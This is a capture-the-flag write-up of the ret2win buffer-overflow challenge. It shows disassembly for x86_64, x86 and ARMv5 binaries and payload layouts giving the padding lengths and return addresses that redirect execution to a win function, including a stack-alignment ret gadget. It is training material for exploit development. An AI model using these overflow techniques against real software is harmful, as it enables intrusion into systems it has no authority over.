# ret2win

This is the first of the 8 challenges, it's also the simplest.
All binaries have the same vulnerability which is a buffer overflow in the `pwnme` function.

For this one, we can find the ret2win function by listing symbols of the file with nm.
```bash
$ nm ret2win
...
0000000000400756 t ret2win  # x86_64
...
0804862c t ret2win          # x86
...
000105ec t ret2win          # ARMv5
...
```
The objective become clear: return from `pwnme` into `ret2win`.
For all architectures, the buffer overflow is a read of 56 bytes into a 32 bytes buffer.

## x86_64:
```asm
0000000000400733 <pwnme + 0x4b>:
  400733:	48 8d 45 e0      lea    rax,[rbp-0x20]
  400737:	ba 38 00 00 00   mov    edx,0x38
  40073c:	48 89 c6         mov    rsi,rax
  40073f:	bf 00 00 00 00   mov    edi,0x0
  400744:	e8 47 fe ff ff   call   400590 <read@plt>
...

0000000000400754 <pwnme + 0x6c>:
  400754:	c9               leave
  400755:	c3               ret
```
We have only the 32 bytes for the buffer, so it will only take 40 bytes to reach the return address.
However, this is a x64 challenge so the stack pointer has to be 16-byte aligned when returning
from functions. To avoid a segfault on an aligned memory move, we can stick the address of a `ret`
instruction before the ret2win address.
```
┌─────────────────────────┐  ┌─────────────────────────┐
│ buffer                  │  │ 20 20 20 20 20 20 20 20 │ <- padding (40 bytes)
│                         │  │ 20 20 20 20 20 20 20 20 │
│                         │  │ 20 20 20 20 20 20 20 20 │
├─────────────────────────┤  │ 20 20 20 20 20 20 20 20 │
│ old_rbp                 │  │ 20 20 20 20 20 20 20 20 │
├─────────────────────────┤  ├─────────────────────────┤
│ ret                     │  │ 0x400755                │ <- ret
├─────────────────────────┤  ├─────────────────────────┤
│ ...                     │  │ 0x400756                │ <- ret2win address
└─────────────────────────┘  └─────────────────────────┘
```
## x86:
```asm
08048609 <pwnme + 0x5c>:
 8048609:	6a 38            push   0x38
 804860b:	8d 45 d8         lea    eax,[ebp-0x28]
 804860e:	50               push   eax
 804860f:	6a 00            push   0x0
 8048611:	e8 9a fd ff ff   call   80483b0 <read@plt>
...
0804862a <pwnme + 0x7d>
 804862a:	c9                   	leave
 804862b:	c3                   	ret
```
Since the `leave` instruction is cleaning the stack frame for this function,
and the read call is writing at `[ebp - 0x28]`, we can deduce that the return address will be
at `buffer + 0x28 + 0x4 = buffer + 44`. Thus we need 44 bytes of padding, then the ret2win address
```
┌─────────────┐  ┌─────────────┐
│ buffer      │  │ 20 20 20 20 │ <- padding (44 bytes)
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
├─────────────┤  │ 20 20 20 20 │
│ ...         │  │ 20 20 20 20 │
├─────────────┤  │ 20 20 20 20 │
│ ...         │  │ 20 20 20 20 │
├─────────────┤  │ 20 20 20 20 │
│ old ebp     │  │ 20 20 20 20 │
├─────────────┤  ├─────────────┤
│ ret         │  │ 0x804862c   │ <- ret2win address
└─────────────┘  └─────────────┘
```
## ARM:
```asm
00010570 <pwnme>:
   10570:	e92d4800 	push	{fp, lr}
   10574:	e28db004 	add	fp, sp, #4
   10578:	e24dd020 	sub	sp, sp, #32
...
000105b0 <pwnme + 0x40>:
   105b0:	e24b3024 	sub	r3, fp, #36
   105b4:	e3a02038 	mov	r2, #56
   105b8:	e1a01003 	mov	r1, r3
   105bc:	e3a00000 	mov	r0, #0
   105c0:	ebffff80 	bl	103c8 <read@plt>
...
000105d0 <pwnme + 0x60>:
   105d0:	e24bd004 	sub	sp, fp, #4
   105d4:	e8bd8800 	pop	{fp, pc}
```
In ARMv5, the return address is the `lr` register.   
So in order to overwrite it, we need 36 bytes of padding, then the ret2win address.   
```bash
┌─────────────┐  ┌─────────────┐
│ buffer      │  │ 20 20 20 20 │ <- padding (36 bytes)
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
├─────────────┤  │ 20 20 20 20 │
│ old fp      │  │ 20 20 20 20 │
├─────────────┤  ├─────────────┤
│ lr          │  │ 0x105ec     │ <- ret2win address
└─────────────┘  └─────────────┘
```
